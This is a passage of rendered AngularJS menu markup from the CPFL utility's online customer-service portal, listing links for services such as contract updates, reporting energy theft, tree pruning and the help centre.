                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/atualizacao-conjuge"
                                                                                ui-sref="app.atualizacao-conjuge"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Atualização
                                                                                    de cônjuge</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/contrato-fornecimento"
                                                                                ui-sref="app.contrato-fornecimento"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Contrato
                                                                                    de fornecimento</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/revisao-cadastral"
                                                                                ui-sref="app.revisao-cadastral"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Revisão
                                                                                    cadastral</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/reprogramacao-nota-servico"
                                                                                ui-sref="app.reprogramacao-ns"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Reprogramação
                                                                                    de Nota de Serviço</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/cadastro-uti-domiciliar"
                                                                                ui-sref="app.cadastro-uti-domiciliar"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Cadastro
                                                                                    de UTI domiciliar</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/autorizado-xml-nf3e"
                                                                                ui-sref="app.autorizado-xml-nf3e"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Autorizados
                                                                                    XML</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: items[0].classItem !== 'sub-item-menu' -->
                                                                    </ul>
                                                                </div><!-- end ngIf: item.items.length > 0 -->
                                                            </li>
                                                            <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                            <!-- end ngRepeat: item in ::items -->
                                                            <!-- ngIf: items[0].classItem !== 'sub-item-menu' -->
                                                            <div ng-if="items[0].classItem !== &#39;sub-item-menu&#39;"
                                                                class="col-md-8 text-left text-align-middle ng-scope ng-binding"
                                                                translate=""
                                                                style="margin: 0em; position: absolute; top: 50%; left: 75%; margin - right: -50%; transform: translate(-50%, -50%); ">
                                                            </div>
                                                            <!-- end ngIf: items[0].classItem !== 'sub-item-menu' -->
                                                        </ul>
                                                    </li>
                                                    <!-- end ngIf: menuCtrl.itemsMenuLoaded &&
                                                                  menuCtrl.getClientId() != 'agencia-virtual-cpfl-credenciados' -->
                                                    <!-- ngIf: menuCtrl.itemsMenuLoaded &&
                                                                  menuCtrl.getClientId() != 'agencia-virtual-cpfl-credenciados' -->
                                                    <li class="dropdown mega-dropdown ng-scope"
                                                        ng-if="menuCtrl.itemsMenuLoaded &amp;&amp;
                                                                  menuCtrl.getClientId() != &#39;agencia-virtual-cpfl-credenciados&#39;"><a
                                                            class="dropdown-toggle ng-scope" data-toggle="dropdown"
                                                            translate="@APP-COMMON-MENU-OUTROS-SERVICOS">Outros
                                                            serviços</a>
                                                        <ul class="site-menu dropdown-menu mega-dropdown-menu multi-level col-md-20 ng-isolate-scope"
                                                            suffix=" " flag="" name="menuOutrosServicos" legend="">
                                                            <!-- ngRepeat: item in ::items -->
                                                            <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                            <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                ng-mouseover="emitEvent(item);"
                                                                ng-mouseleave="eventHidetooltip();"
                                                                ng-repeat="item in ::items"
                                                                ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                class="ng-scope col-md-16 border-right">
                                                                <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                <!-- ngIf: item.items.length > 0 -->
                                                                <div ng-if="item.items.length &gt; 0" class="ng-scope">
                                                                    <ul class="col-md-20 ng-isolate-scope" suffix=" "
                                                                        flag="" items="item.items">
                                                                        <!-- ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/denuncia-furto"
                                                                                ui-sref="app.denuncia-furto"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Denunciar
                                                                                    furto de energia</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/reparos-ip"
                                                                                ui-sref="app.reparos-ip" ui-sref-opts=""
                                                                                class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Reparos
                                                                                    de iluminação pública</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/poda-arvore"
                                                                                ui-sref="app.poda-arvore"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Poda de
                                                                                    árvore</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/doacoes"
                                                                                ui-sref="app.doacoes" ui-sref-opts=""
                                                                                class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Doações</span>
                                                                            </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/documentos-de-inspecao"
                                                                                ui-sref="app.documentos-de-inspecao"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Documentos
                                                                                    de Inspeção</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/indenizacao-danos"
                                                                                ui-sref="app.indenizacao-danos"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Ressarcimento
                                                                                    de Danos Elétricos</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: items[0].classItem !== 'sub-item-menu' -->
                                                                    </ul>
                                                                </div><!-- end ngIf: item.items.length > 0 -->
                                                            </li>
                                                            <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                            <!-- end ngRepeat: item in ::items -->
                                                            <!-- ngIf: items[0].classItem !== 'sub-item-menu' -->
                                                            <div ng-if="items[0].classItem !== &#39;sub-item-menu&#39;"
                                                                class="col-md-8 text-left text-align-middle ng-scope ng-binding"
                                                                translate=""
                                                                style="margin: 0em; position: absolute; top: 50%; left: 75%; margin - right: -50%; transform: translate(-50%, -50%); ">
                                                            </div>
                                                            <!-- end ngIf: items[0].classItem !== 'sub-item-menu' -->
                                                        </ul>
                                                    </li>
                                                    <!-- end ngIf: menuCtrl.itemsMenuLoaded &&
                                                                  menuCtrl.getClientId() != 'agencia-virtual-cpfl-credenciados' -->
                                                    <!-- ngIf: menuCtrl.itemsMenuLoaded &&
                                                                  menuCtrl.getClientId() != 'agencia-virtual-cpfl-credenciados' -->
                                                    <li class="dropdown mega-dropdown ng-scope"
                                                        ng-if="menuCtrl.itemsMenuLoaded &amp;&amp;
                                                                  menuCtrl.getClientId() != &#39;agencia-virtual-cpfl-credenciados&#39;"><a
                                                            class="dropdown-toggle ng-scope" data-toggle="dropdown"
                                                            translate="@APP-COMMON-MENU-AJUDA-ONLINE">Ajuda online</a>
                                                        <ul class="site-menu dropdown-menu mega-dropdown-menu multi-level col-md-20 ng-isolate-scope"
                                                            suffix=" " flag="" name="menuAjudaOnline" legend="">
                                                            <!-- ngRepeat: item in ::items -->
                                                            <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                            <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                ng-mouseover="emitEvent(item);"
                                                                ng-mouseleave="eventHidetooltip();"
                                                                ng-repeat="item in ::items"
                                                                ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                class="ng-scope col-md-16 border-right">
                                                                <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                <!-- ngIf: item.items.length > 0 -->
                                                                <div ng-if="item.items.length &gt; 0" class="ng-scope">
                                                                    <ul class="col-md-20 ng-isolate-scope" suffix=" "
                                                                        flag="" items="item.items">
                                                                        <!-- ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/central-ajuda"
                                                                                ui-sref="app.central-ajuda"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Central
                                                                                    de ajuda</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/itens-faturamento"
                                                                                ui-sref="app.itens-faturamento"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Glossário
                                                                                    itens de faturamento</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/custeio-iluminacao-publica"
                                                                                ui-sref="app.custeio-iluminacao-publica"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Custeio
                                                                                    de iluminação pública</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
                                                                            ng-repeat="item in ::items"
                                                                            ng-if="((item.status !== &#39;hidden&#39;) || isValidRole(item))"
                                                                            class="ng-scope col-md-12">
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) --><a
                                                                                ng-if="(((item.status !== &#39;disabled&#39;) || isValidRole(item)) &amp;&amp; item.state)"
                                                                                href="https://servicosonline.cpfl.com.br/agencia-webapp/#/indicadores-qualidade"
                                                                                ui-sref="app.indicadores-qualidade"
                                                                                ui-sref-opts="" class="ng-scope"><i
                                                                                    ng-class="item.classIcon"></i><span
                                                                                    ng-class="item.classLabel"
                                                                                    translate=""
                                                                                    class="ng-scope ng-binding">Indicadores
                                                                                    de Qualidade</span> </a>
                                                                            <!-- end ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.state) -->
                                                                            <!-- ngIf: (((item.status !== 'disabled') || isValidRole(item)) && item.url) -->
                                                                            <!-- ngIf: (item.status === 'disabled' && !isValidRole(item)) -->
                                                                            <!-- ngIf: item.items.length > 0 -->
                                                                        </li>
                                                                        <!-- end ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <!-- end ngRepeat: item in ::items -->
                                                                        <!-- ngIf: ((item.status !== 'hidden') || isValidRole(item)) -->
                                                                        <li ng-class="{&#39;col-md-12&#39;: item.classItem == &#39;sub-item-menu&#39;, &#39;col-md-16 border-right&#39;: item.classItem != &#39;sub-item-menu&#39;}"
                                                                            ng-mouseover="emitEvent(item);"
                                                                            ng-mouseleave="eventHidetooltip();"
